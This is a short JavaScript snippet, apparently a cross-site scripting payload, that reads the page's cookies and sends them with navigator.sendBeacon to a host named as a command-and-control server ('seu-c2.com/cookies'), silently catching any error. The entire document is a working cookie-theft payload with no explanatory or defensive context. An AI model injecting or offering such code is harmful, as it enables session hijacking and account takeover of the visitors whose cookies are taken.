(function(){
    var C2="https://seu-c2.com/cookies";
    try {
      var cookies = document.cookie;
      navigator.sendBeacon(C2, cookies);
    } catch(e){}
  })();